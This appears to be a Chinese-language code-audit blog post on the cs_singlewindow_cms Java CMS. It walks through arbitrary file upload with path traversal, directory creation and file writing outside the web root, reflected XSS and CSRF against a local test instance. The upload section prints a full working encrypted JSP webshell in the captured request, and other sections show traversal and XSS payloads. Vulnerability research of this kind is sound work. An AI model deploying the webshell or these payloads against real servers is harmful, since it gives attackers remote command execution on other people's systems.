---
title: cs_singlewindow_cms
description: GitHub地址-https://github.com/xitaofeng/cs_singlewindow_cms
date: 2024-12-10
image: cover.png
categories:
    - cate2
tags:
    - Code Audit
---


## 项目技术栈

### 后端技术

SpringBoot：提供了对Spring开箱即用的功能。简化了Spring配置，提供自动配置 auto-configuration功能。

Spring：是提供了IoC等功能，是目前最流行的Java企业级开发框架。

SpringMVC：MVC框架，使用方便，Bug较少。

JPA：持久化框架。属于JSR标准，JPA实现选择最常用的Hibernate。

SpringDataJPA：对JPA封装，大部分查询只需要在接口中写方法，而不需要实现改方法，极大开发效率。

QueryDSL：实现类型安全的JPA查询，使用对象及属性实现查询，避免编写jpql出现的拼错字符及属性名记忆负担。

FreeMarker：模板组件。

Shiro：安全组件。配置简便。

Lucene：全文检索组件。实现对中文的分词搜索。

Ehcache：缓存组件。主要用在JPA二级缓存、Shiro权限缓存。

Quartz：定时任务组件。

### 前端技术

jQuery：JavaScript库。

Bootstrap：响应式设计前端框架。

AdminLTE：后台管理平台开源框架。

jQuery UI：基于jQuery的UI框架。

jQuery Validation：基于jQuery的表单校验框架。

UEditor：Web富文本编辑器。

Editor.md：基于Markdown语法的Web文本编辑器。

ECharts：用于生成图标的组件。

My97DatePicker：日期组件。

zTree：树组件。

## 项目依赖审计

​	项目为maven项目，因此来到pom.xml文件审计。

​	经审计发现，该项目引入中并不存在已披露的漏洞。

## 单点漏洞审计

### 	SQL注入

#### cs_singlewindow_cms-master\src\main\java\com\jspxcms\core\repository\InfoDao.java（失败）

```java
    @Query("select count(*) from Info bean where bean.node.id in (?1) and bean.status!='" + Info.DELETED + "'")
    public long countByNodeIdNotDeleted(Collection<Integer> nodeIds);

    @Query("select count(*) from Info bean where bean.org.id in (?1) and bean.status!='" + Info.DELETED + "'")
    public long countByOrgIdNotDeleted(Collection<Integer> orgIds);
```

​	发现这里使用了动态拼接，但是参数无法控制。

#### cs_singlewindow_cms-master\src\main\java\com\jspxcms\core\repository\impl\MessageDaoImpl.java（失败）

```java
private JpqlBuilder groupByUserId(Integer userId, boolean unread) {
        ...省略...
        if (unread) {
            jb.append("having number_of_unread_>0");
            jb.setCountQueryString("select count(*) from (" + jb.getQueryString() + ")");
        } else {
            jb.setCountProjection("distinct contact_id_");
        }
        ...省略...
    }
```

​	未被控制器调用。

​	审计了删改增也没有发现漏洞，虽然也存在动态拼接但是也都无法操控。

### 	任意文件操控

​	我们来到文件上传的控制器

#### src/main/java/com/jspxcms/core/web/back/WebFileUploadsController.java（成功）

##### 	上传

控制器：

```java
	@RequiresPermissions("core:web_file_2:upload")
	@RequestMapping("upload.do")
	public void upload(@RequestParam(value = "file", required = false) MultipartFile file, String parentId,
			HttpServletRequest request, HttpServletResponse response) throws IllegalStateException, IOException {
		super.upload(file, parentId, request, response);
	}

```

文件上传的实现函数：

```java
	protected void upload(MultipartFile file, String parentId, HttpServletRequest request, HttpServletResponse response)
			throws IllegalStateException, IOException {
		Site site = Context.getCurrentSite();
		// parentId = parentId == null ? base : parentId;
		String base = getBase(site);
		if (!Validations.uri(parentId, base)) {
			throw new CmsException("invalidURI", parentId);
		}
		FileHandler fileHandler = getFileHandler(site);
		fileHandler.store(file, parentId);
		logService.operation("opr.webFile.upload", parentId + "/" + file.getOriginalFilename(), null, null, request);
		logger.info("upload file, name={}.", parentId + "/" + file.getOriginalFilename());
		Servlets.writeHtml(response, "true");
	}
```

​	这个函数的大概功能是获取站点信息，验证传入的参数，然后保存文件，再把文件的信息写入日志。

```java
public static boolean uri(String value, String prefix) {
    return !StringUtils.contains(value, "..")
            && StringUtils.startsWith(value, prefix);
}
```

​	这里是存在一个过滤的，且过滤了'..'，但是奇怪的是，过滤的parentId而不是文件名，且没有修改文件名，甚至没有对后缀的校验，所以这里是存在任意文件上传和目录穿透的，然后这个项目还会解析JSP，但是需要放到webapp下的JSP文件夹，不过这里还有一个目录穿透所以这就不是问题了，来到前端的功能点。

​	![image-20241209173324471](/image-20241209173324471.png)

​	上传文件后抓包，得到如下数据包：

```http
POST /cmscp/core/web_file_2/upload.do?_site=1 HTTP/1.1
Host: 192.168.227.43:8888
Content-Length: 2387
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZzeGAny76zA7fCma
Origin: http://192.168.227.43:8888
Referer: http://192.168.227.43:8888/cmscp/core/web_file_2/list.do?parentId=%2F1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: select_id=%2F1; open_ids=%2F1; _site=1; JSESSIONID=526DEDE9E36FE99249985E52A100BE8E
Connection: close

------WebKitFormBoundaryZzeGAny76zA7fCma
Content-Disposition: form-data; name="parentId"

/1
------WebKitFormBoundaryZzeGAny76zA7fCma
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    private byte[] Decrypt(byte[] data) throws Exception
    {
        String k="e45e329feb5d925b";
        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES"));
        byte[] decodebs;
        Class baseCls ;
                try{
                    baseCls=Class.forName("java.util.Base64");
                    Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
                    decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
                }
                catch (Throwable e)
                {
                    baseCls = Class.forName("sun.misc.BASE64Decoder");
                    Object Decoder=baseCls.newInstance();
                    decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});

                }
        return c.doFinal(decodebs);

    }
%>
<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性
            out.clear();
            out=pageContext.pushBody();
            */
            out.clear();
            out=pageContext.pushBody();
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
%>
------WebKitFormBoundaryZzeGAny76zA7fCma--

```

​	修改文件名为../../jsp/shell.jsp，之后我们访问[192.168.227.43:8888/shell.jsp](http://192.168.227.43:8888/shell.jsp)，会发现没有提示404也就是传马成功了，我们使用冰蝎链接，并输入calc命令弹出计算机，可见命令成功执行。

![image-20241209173729074](/image-20241209173729074.png)

##### 	下载

控制器：

```java
	@RequiresPermissions("core:web_file_2:zip_download")
	@RequestMapping("zip_download.do")
	public void zipDownload(HttpServletRequest request, HttpServletResponse response, RedirectAttributes ra)
			throws IOException {
		super.zipDownload(request, response, ra);
	}
```

压缩下载实现函数：

```java
protected void zipDownload(HttpServletRequest request, HttpServletResponse response, RedirectAttributes ra)
			throws IOException {
		Site site = Context.getCurrentSite();
		FileHandler fileHandler = getFileHandler(site);
		if (!(fileHandler instanceof LocalFileHandler)) {
			throw new CmsException("ftp cannot support ZIP.");
		}
		LocalFileHandler localFileHandler = (LocalFileHandler) fileHandler;

		String[] ids = Servlets.getParamValues(request, "ids");
		String base = getBase(site);

		File[] files = new File[ids.length];
		for (int i = 0, len = ids.length; i < len; i++) {
			if (!Validations.uri(ids[i], base)) {
				throw new CmsException("invalidURI");
			}
			files[i] = localFileHandler.getFile(ids[i]);
		}
		response.setContentType("application/x-download;charset=UTF-8");
		response.addHeader("Content-disposition", "filename=download_files.zip");
		try {
			AntZipUtils.zip(files, response.getOutputStream());
		} catch (IOException e) {
			logger.error("zip error!", e);
		}
	}
```

​	这段代码的核心功能就是从请求获取所有的文件，然后遍历这些文件，打包到压缩包里边。分析得出在这一部分检测了文件名的'..'所以这里是不存在任意文件下载的。

##### 创建

控制器：

```java
	@RequiresPermissions("core:web_file_2:mkdir")
	@RequestMapping(value = "mkdir.do", method = RequestMethod.POST)
	public String mkdir(String parentId, String dir, HttpServletRequest request, HttpServletResponse response,
			RedirectAttributes ra) throws IOException {
		return super.mkdir(parentId, dir, request, response, ra);
	}
```

功能实现：

```java
	protected String mkdir(String parentId, String dir, HttpServletRequest request, HttpServletResponse response,
			RedirectAttributes ra) throws IOException {
		Site site = Context.getCurrentSite();
		parentId = parentId == null ? "" : parentId;
		String base = getBase(site);

		if (StringUtils.isBlank(parentId)) {
			parentId = base;
		}
		if (!Validations.uri(parentId, base)) {
			throw new CmsException("invalidURI");
		}
		FileHandler fileHandler = getFileHandler(site);
		boolean success = fileHandler.mkdir(dir, parentId);
		if (success) {
			logService.operation("opr.role.add", parentId + "/" + dir, null, null, request);
			logger.info("mkdir file, name={}.", parentId + "/" + dir);
		}
		ra.addFlashAttribute("refreshLeft", true);
		ra.addAttribute("parentId", parentId);
		ra.addFlashAttribute(MESSAGE, success ? OPERATION_SUCCESS : OPERATION_FAILURE);
		return "redirect:list.do";
	}
```

​	这个代码是在上传文件中的新建文件夹中，经过审计我发现，这里虽存在拦截，但是拦截的对象是parentId。而dir未被拦截，所以我们可以构造如下的数据包。

```http
POST /cmscp/core/web_file_2/mkdir.do HTTP/1.1
Host: 172.21.87.148:8888
Content-Length: 25
Cache-Control: max-age=0
Origin: http://172.21.87.148:8888
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.21.87.148:8888/cmscp/core/web_file_2/list.do
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: select_id=%2F1; open_ids=%2F1; _site=1; JSESSIONID=CA7DD070F74CFE10991C0475CE82606D
Connection: close

parentId=%2F1&dir=../../../../../test
```

​	就可以实现在项目的根路径下创建一个test文件夹。

![image-20241210114831516](/image-20241210114831516.png)

控制器：

```java
	@RequiresPermissions("core:web_file_2:save")
	@RequestMapping(value = "save.do", method = RequestMethod.POST)
	public String save(String parentId, String name, String text, String redirect, HttpServletRequest request,
			HttpServletResponse response, RedirectAttributes ra) throws IOException {
		return super.save(parentId, name, text, redirect, request, response, ra);
	}
```

功能实现：

```java
	protected String save(String parentId, String name, String text, String redirect, HttpServletRequest request,
			HttpServletResponse response, RedirectAttributes ra) throws IOException {
		Site site = Context.getCurrentSite();
		String base = getBase(site);

		if (!Validations.uri(parentId, base)) {
			throw new CmsException("invalidURI");
		}
		FileHandler fileHandler = getFileHandler(site);
		fileHandler.store(text, name, parentId);
		logService.operation("opr.webFile.add", parentId + "/" + name, null, null, request);
		logger.info("save file, name={}.", parentId + "/" + name);
		ra.addFlashAttribute("refreshLeft", true);
		ra.addAttribute("parentId", parentId);
		ra.addFlashAttribute(MESSAGE, SAVE_SUCCESS);
		if (Constants.REDIRECT_LIST.equals(redirect)) {
			return "redirect:list.do";
		} else if (Constants.REDIRECT_CREATE.equals(redirect)) {
			return "redirect:create.do";
		} else {
			ra.addAttribute("id", parentId + "/" + name);
			return "redirect:edit.do";
		}
	}
```

​	这里也是同样的漏洞，仅过滤了parentId而没有过滤name参数，所以这里也有目录穿透，新建一个文档，输入success，然后抓包。

```http
POST /cmscp/core/web_file_2/save.do HTTP/1.1
Host: 172.21.87.148:8888
Content-Length: 89
Cache-Control: max-age=0
Origin: http://172.21.87.148:8888
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.21.87.148:8888/cmscp/core/web_file_2/create.do?parentId=%2F1&
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: select_id=%2F1; open_ids=%2F1; _site=1; JSESSIONID=CA7DD070F74CFE10991C0475CE82606D
Connection: close

origName=&parentId=%2F1&position=&redirect=edit&name=test.html&baseName=test&text=success
```

​	将name参数修改为../../../../../test.html即可在项目根目录下创建一个test.html文件。

![image-20241210121816150](/image-20241210121816150.png)

​	不仅如此，我们还发现他也没有对后缀进行任何的过滤，因此，我们可以尝试直接写一个马上去，而且这里甚至不需要使用目录穿透，因为他没有对文件内容进行过滤，所以我们可以直接在jsp文件夹里边写马，如下：

![image-20241210192127345](/image-20241210192127345.png)

​	冰蝎链接后执行命令：

![image-20241210192255646](/image-20241210192255646.png)

### XSS

​	经过审计和前端测试，该项目也是存在多个XSS，所以这里只拿出一个较有价值的反射型XSS。

```java
	@RequiresPermissions("core:homepage:mail_inbox:list")
	@RequestMapping(value = "mail_inbox_list.do")
	public String mailInboxList(@RequestParam(defaultValue = "false") boolean unread,
			@PageableDefault(sort = "receiveTime", direction = Direction.DESC) Pageable pageable,
			HttpServletRequest request, org.springframework.ui.Model modelMap) {
		User user = Context.getCurrentUser();
		Map<String, String[]> params = Servlets.getParamValuesMap(request, Constants.SEARCH_PREFIX);
		Page<MailInbox> pagedList = inboxService.findAll(user.getId(), params, pageable);
		modelMap.addAttribute("pagedList", pagedList);
		return "core/homepage/mail_inbox_list";
	}
```

​	这个控制器的大致逻辑是先检测用户的权限，然后从请求体中获取传参，然后传入findALL进行查找，返回分页后的结果，然后再把结果渲染进模板中最后返回到前端。可见这里并没有对XSS进行过滤或者拦截，我们定位到前端的系统消息-列表的搜索功能点。

​	URL如下：

```
http://172.21.87.148:8888/cmscp/core/homepage/mail_inbox_list.do?search_CONTAIN_mailText.subject=test
```

​	我们开始构造XSSpayload：

```html
"><img%20src=x onerror=alert('xss')><
```

​	访问一下：

![image-20241210194803752](/image-20241210194803752.png)

​	其余的搜索框也是一样的漏洞。

### CSRF

​	我们来到TAG管理这里，新建一个TAG，抓包。

```http
POST /cmscp/core/tag/save.do HTTP/1.1
Host: 172.21.87.148:8888
Content-Length: 52
Cache-Control: max-age=0
Origin: http://172.21.87.148:8888
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.21.87.148:8888/cmscp/core/tag/create.do?
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: _site=1; JSESSIONID=FE1E77A0FA48CA0F95810E8740DBB51E
Connection: close

oid=&position=&redirect=edit&name=CSRF&creationDate=
```

​	创建CSRF的POC然后模拟管理员访问该链接。

![image-20241210195356700](/image-20241210195356700.png)

​	成功。
   至此该项目审计结束。